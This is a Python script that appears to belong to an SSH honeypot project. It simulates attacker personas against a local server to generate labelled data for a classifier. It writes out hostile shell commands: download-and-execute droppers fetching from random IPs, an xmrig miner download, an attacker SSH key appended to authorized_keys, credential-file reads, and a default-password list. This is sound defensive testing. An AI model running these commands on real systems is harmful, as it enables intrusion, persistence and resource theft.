"""Attacker simulators for Genno: scripted personas, each from its own source IP (127.x.y.z).

Writes ground truth (ip -> expected label) so the classifier can be scored against it.
Run against a host-run server (python -m genno.ssh.server --host 0.0.0.0): through Docker's
port mapping every client would appear as the bridge gateway IP and per-IP features collapse.
"""
import argparse, asyncio, json, random
import asyncssh

DEMO_ALLOW = [("root", "123456"), ("admin", "admin123"), ("ubuntu", "ubuntu")]   # server policy for the demo
BAD_CREDS = [("root", "root"), ("root", "password"), ("admin", "1234"), ("test", "test"), ("user", "user"),
             ("oracle", "oracle"), ("postgres", "postgres"), ("pi", "raspberry"), ("root", "toor"),
             ("ftp", "ftp"), ("guest", "guest"), ("root", "qwerty"), ("admin", "password"), ("ubnt", "ubnt")]
DEFAULT_COUNTS = {"scanner": 6, "brute_force": 2, "recon_bot": 5, "malware_dropper": 5,
                  "cryptominer": 2, "persistence": 2, "human": 2}
PERSONA_IDX = {p: i + 1 for i, p in enumerate(DEFAULT_COUNTS)}
CLIENTS = ["libssh2_1.10.0", "Go", "paramiko_3.4.1", "OpenSSH_9.6p1 Ubuntu-3ubuntu13", "PuTTY_Release_0.78"]
RECON = ["uname -a; cat /proc/cpuinfo | grep name | wc -l; free -m; nproc; id; whoami",
         "uname -m; cat /etc/passwd | head -3; ps aux | head -5; uptime",
         "cat /proc/cpuinfo | grep -c processor; uname -r; hostname; ls -la /"]
HUMAN = ["ls", "pwd", "cd /var/www/html", "ls -la", "cat config.php", "sl", "cat /root/.bash_history"]


def _ip(persona, n):
    return f"127.{PERSONA_IDX[persona]}.{n // 250}.{n % 250 + 1}"


def _rand_ip(rng):
    return f"{rng.randint(11, 223)}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"


async def _connect(host, port, ip, user, pw, client):
    return await asyncssh.connect(host, port, username=user, password=pw, known_hosts=None, client_keys=None,
                                  agent_path=None, local_addr=(ip, 0), client_version=client)


async def _exec(host, port, ip, rng, cmds, gap=0.0):
    user, pw = rng.choice(DEMO_ALLOW)
    async with await _connect(host, port, ip, user, pw, rng.choice(CLIENTS)) as c:
        for cmd in cmds:
            await c.run(cmd, check=False)
            await asyncio.sleep(gap)


async def scanner(host, port, ip, rng, scale):
    r, w = await asyncio.open_connection(host, port, local_addr=(ip, 0))
    await r.readline()
    w.close(); await w.wait_closed()


async def brute_force(host, port, ip, rng, scale, tries=12):
    """Hydra-style: one guess per connection, so each connection is its own one-attempt session."""
    for user, pw in rng.sample(BAD_CREDS, min(tries, len(BAD_CREDS))):
        try:
            c = await _connect(host, port, ip, user, pw, "libssh2_1.10.0")
            c.close()
        except (asyncssh.PermissionDenied, asyncssh.Error, OSError):
            pass


async def recon_bot(host, port, ip, rng, scale):
    await _exec(host, port, ip, rng, [rng.choice(RECON)])


async def malware_dropper(host, port, ip, rng, scale):
    u = f"http://{_rand_ip(rng)}/{rng.choice(['bins.sh', 'x86', 'update.sh', 'a.sh'])}"
    tool = rng.choice([f"wget {u} -O .x", f"curl -sO {u}; mv x86 .x 2>/dev/null"])
    await _exec(host, port, ip, rng, [f"cd /tmp; {tool}; chmod 777 .x; sh .x; ./.x; rm -f .x"])


async def cryptominer(host, port, ip, rng, scale):
    u = f"http://{_rand_ip(rng)}/xmrig.tar.gz"
    await _exec(host, port, ip, rng, [f"cd /tmp && wget {u} && tar xf xmrig.tar.gz && ./xmrig -o stratum+tcp://pool.test:3333"])


async def persistence(host, port, ip, rng, scale):
    key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0 attacker@kali"
    await _exec(host, port, ip, rng, [f'mkdir -p ~/.ssh; echo "{key}" >> ~/.ssh/authorized_keys; '
                                      f"chmod 600 ~/.ssh/authorized_keys; uname -a"])


async def human(host, port, ip, rng, scale):
    user, pw = rng.choice(DEMO_ALLOW)
    async with await _connect(host, port, ip, user, pw, "OpenSSH_9.6p1 Ubuntu-3ubuntu13") as c:
        p = await c.create_process(term_type="xterm")
        for cmd in HUMAN:
            await asyncio.sleep(rng.uniform(1.2, 3.0) * scale)
            p.stdin.write(cmd + "\n")
        await asyncio.sleep(1.5 * scale)
        p.stdin.write("exit\n")
        await asyncio.wait_for(p.wait(), 15)


PERSONAS = {"scanner": scanner, "brute_force": brute_force, "recon_bot": recon_bot,
            "malware_dropper": malware_dropper, "cryptominer": cryptominer,
            "persistence": persistence, "human": human}


async def run_campaign(host="127.0.0.1", port=2222, seed=1, scale=1.0, counts=None, concurrency=20):
    """-> (truth {ip: expected_label}, failures [exceptions])"""
    rng, counts, sem, jobs, truth = random.Random(seed), counts or DEFAULT_COUNTS, asyncio.Semaphore(concurrency), [], {}

    async def guarded(fn, ip, r):
        async with sem:
            await fn(host, port, ip, r, scale)

    for persona, n in counts.items():
        for i in range(n):
            ip = _ip(persona, i)
            truth[ip] = persona
            jobs.append(guarded(PERSONAS[persona], ip, random.Random(rng.random())))
    res = await asyncio.gather(*jobs, return_exceptions=True)
    return truth, [r for r in res if isinstance(r, Exception)]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=2222)
    ap.add_argument("--seed", type=int, default=1)
    ap.add_argument("--scale", type=float, default=1.0, help="multiplies human think-time")
    ap.add_argument("--truth", default="data/sim_truth.json")
    a = ap.parse_args()
    truth, fails = asyncio.run(run_campaign(a.host, a.port, a.seed, a.scale))
    json.dump(truth, open(a.truth, "w"), indent=1)
    print("(server must allow: --allow root:123456 --allow admin:admin123 --allow ubuntu:ubuntu)")
    print(f"{len(truth)} attackers simulated, {len(fails)} failures, truth -> {a.truth}")
    for f in fails[:5]: print("  ", repr(f))

if __name__ == "__main__":
    main()
